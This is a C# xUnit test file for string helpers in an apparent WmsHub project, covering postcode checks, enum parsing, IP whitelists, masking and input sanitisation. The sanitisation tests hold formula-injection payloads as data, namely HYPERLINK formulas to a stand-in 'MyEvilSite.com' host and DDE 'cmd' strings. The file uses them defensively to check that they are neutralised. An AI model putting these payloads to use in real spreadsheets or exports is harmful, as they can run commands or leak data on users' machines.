using System;
using System.Collections.Generic;
using FluentAssertions;
using WmsHub.Common.Extensions;
using Xunit;

namespace WmsHub.Common.Tests
{
  public class StringExtensionsTests
  {
    public class IsPostcode : StringExtensionsTests
    {
      [Theory]
      [InlineData(null)]
      [InlineData("")]
      [InlineData(" ")]
      [InlineData(" A")]
      [InlineData("A")]
      [InlineData("AA")]
      [InlineData("AA1")]
      [InlineData("AA1 ")]
      [InlineData("AA1 1")]
      [InlineData("AA1 X")]
      [InlineData("AA1 1A")]
      [InlineData("AA1 1A A")]
      [InlineData("AA1 1AA A")]
      [InlineData(" AA1 1AA ")]
      public void Invalid(string postcode)
      {
        // act
        bool result = postcode.IsPostcode();

        // assert
        result.Should().BeFalse();
      }

      [Theory]
      [InlineData("AA1 1AA")]
      [InlineData("BB11 1BB")]
      public void Valid(string postcode)
      {
        // act
        bool result = postcode.IsPostcode();

        // assert
        result.Should().BeTrue();
      }

    }


    public class ConvertToPostcode : StringExtensionsTests
    {
      [Theory]
      [InlineData(null)]
      [InlineData("")]
      [InlineData(" ")]
      [InlineData(" A")]
      [InlineData("A")]
      [InlineData("AA")]
      [InlineData("AA1")]
      [InlineData("AA1 ")]
      [InlineData("AA1 1")]
      [InlineData("AA1 X")]
      [InlineData("AA1 1A")]
      [InlineData("AA1 1A A")]
      [InlineData("A A1 1A A")]
      public void Invalid(string postcode)
      {
        // act
        postcode = postcode.ConvertToPostcode();

        // assert
        postcode.Should().BeNull($"{postcode} is invalid");
      }

      [Theory]
      [InlineData("ZZ99", "ZZ99 3CZ")]
      [InlineData("AA1 1AA A", "AA1 1AA")]
      [InlineData(" AA1 1AA ", "AA1 1AA")]
      [InlineData(
        "AA11 1AA 111 111 1111 The service can be found within e‐referral",
        "AA11 1AA")]
      public void Valid(string potentialPostcode, string expectedPostcode)
      {
        // act
        potentialPostcode = potentialPostcode.ConvertToPostcode();

        // assert
        potentialPostcode.Should().Be(expectedPostcode);
      }
    }

    public class ParseToEnumNameTests : StringExtensionsTests
    {
      public enum TestEnum
      {
        Undefined,
        Foo,
        Bar
      }


      [InlineData("Undefined", TestEnum.Undefined)]
      [InlineData("Foo", TestEnum.Foo)]
      [InlineData("Bar", TestEnum.Bar)]
      [Theory]
      public void ValidEnum(string testEnum, TestEnum expectedParsedEnum)
      {
        // arrange

        // act
        TestEnum result = testEnum.ParseToEnumName<TestEnum>();

        // assert
        result.Should().Be(expectedParsedEnum);
      }

      [InlineData("undeFined")]
      [InlineData("UNDEFINED")]
      [InlineData("foo")]
      [InlineData("No")]
      [InlineData("2147483648")]
      [Theory]
      public void InvalidEnum_Exception(string testEnum)
      {
        // arrange
        string expectedExceptionMessage = "value is not one of the named " +
          "constants defined for the enumeration.";

        // act
        var ex = Record.Exception(() => testEnum.ParseToEnumName<TestEnum>());

        // assert
        ex.Should().BeOfType<ArgumentException>();
        ex.Message.Should().Be(expectedExceptionMessage);
      }
    }


    public class TryParseToEnumTests : StringExtensionsTests
    {
      public enum TestEnum
      {
        Undefined,
        Foo,
        Bar
      }

      [InlineData("Undefined", TestEnum.Undefined)]
      [InlineData("Foo", TestEnum.Foo)]
      [InlineData("Bar", TestEnum.Bar)]
      [Theory]
      public void ValidEnum(string testEnum, TestEnum expectedParsedEnum)
      {
        // arrange

        // act
        bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

        // assert
        result.Should().BeTrue();
        parsedEnum.Should().Be(expectedParsedEnum);
      }

      [InlineData("undeFined", TestEnum.Undefined)]
      [InlineData("UNDEFINED", TestEnum.Undefined)]
      [InlineData("foo", TestEnum.Foo)]
      [InlineData("bar", TestEnum.Bar)]
      [Theory]
      public void InvalidEnum_Case_Incorrect(
        string testEnum, TestEnum expectedParsedEnum)
      {
        // arrange

        // act
        bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

        // assert
        result.Should().BeFalse();
        parsedEnum.Should().Be(expectedParsedEnum);
      }


      [InlineData("No")]
      [InlineData("1")]
      [InlineData("2147483648")]
      [Theory]
      public void InvalidEnum(string testEnum)
      {
        // arrange

        // act
        bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

        // assert
        result.Should().BeFalse();
        parsedEnum.Should().Be(TestEnum.Undefined);
      }
    }

    public class TryParseIpWhitelistTests : StringExtensionsTests
    {
      [Fact]
      public void TestValidIpAddress()
      {
        //Arrange
        string[] whiteList = new[]
          {"129.168.0.1", "127.0.0.1", "::1", "192.168.0.10-20"};
        string ipAddress = "192.168.0.15";
        //Act
        List<string> ipv4totest = whiteList.TryParseIpWhitelist();
        //Assert
        ipv4totest.Should().Contain(ipAddress);
      }
    }

    public class SanitizeInputTests : StringExtensionsTests
    {
      [Theory]
      [InlineData("=HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
        "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
      [InlineData("@=HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
        "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
      [InlineData("==HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
        "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
      [InlineData("=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
        "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
      [InlineData("+=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
        "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
      [InlineData("-=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
        "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
      public void TestStrippedValues(string input, string expected)
      {
        //arrange

        //act
        string result = input.SanitizeInput();

        //assert
        result.Should().Be(expected);
      }
    }

    public class Mask : StringExtensionsTests
    {
      [Theory]
      [InlineData("+4412345678901", '*', 4, "**********8901")]
      [InlineData("1234", 'x', 4, "1234")]
      [InlineData("1234", 'x', 5, "1234")]
      [InlineData("1234", 'x', 0, "xxxx")]
      [InlineData("", 'x', 5, "")]
      [InlineData(null, 'x', 5, null)]
      public void Valid(
        string value, char maskWith, int showLast, string expected)
      {
        string result = value.Mask(maskWith, showLast);

        result.Should().Be(expected);
      }

      [Theory]
      [InlineData("1234", 'x', -1)]
      public void Invalid(string value, char maskWith, int showLast)
      {
       
        Assert.Throws<ArgumentOutOfRangeException>(
          () => value.Mask(maskWith, showLast));

      }
    }
  }
}
